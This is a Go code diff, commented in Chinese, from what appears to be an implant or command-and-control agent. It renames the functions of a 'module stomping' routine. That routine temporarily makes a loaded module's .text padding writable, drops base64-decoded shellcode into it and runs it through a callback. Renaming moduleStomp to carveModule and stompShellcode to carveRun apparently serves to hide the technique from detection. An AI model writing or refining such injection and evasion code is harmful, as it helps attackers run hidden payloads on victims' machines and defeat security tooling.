@@ -21,8 +21,8 @@ import (
 // ⚠️ 实验性：写入只读节需临时改页保护（VirtualProtect），完成后还原；
 // 空洞内已有代码会被覆盖（选用 .text 尾部的对齐空洞，不影响原功能）。
 
-// moduleStomp 在已加载模块的 .text 空洞驻留 shellcode 并返回入口地址。
-func moduleStomp(shellcode []byte) (uintptr, error) {
+// carveModule 在已加载模块的 .text 空洞驻留 shellcode 并返回入口地址。
+func carveModule(shellcode []byte) (uintptr, error) {
 	procEnumModules := resolveAPI("psapi.dll", "K32EnumProcessModules")
 	procGetModuleBaseName := resolveAPI("psapi.dll", "K32GetModuleBaseNameW")
 	procGetModuleInfo := resolveAPI("psapi.dll", "K32GetModuleInformation")
@@ -153,13 +153,13 @@ func strings_containsImageName(mod uintptr, curProc uintptr, procGetModuleBaseNa
 	return false
 }
 
-// stompShellcode 任务入口：base64 shellcode → 模块空洞驻留 → 回调执行。
-func stompShellcode(dataB64 string) (string, int32, string) {
+// carveRun 任务入口：base64 shellcode → 模块空洞驻留 → 回调执行。
+func carveRun(dataB64 string) (string, int32, string) {
 	raw, err := base64.StdEncoding.DecodeString(dataB64)
 	if err != nil {
 		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
 	}
-	entry, err := moduleStomp(raw)
+	entry, err := carveModule(raw)
 	if err != nil {
 		return "", -1, fmt.Sprintf("module stomp failed: %v", err)
 	}
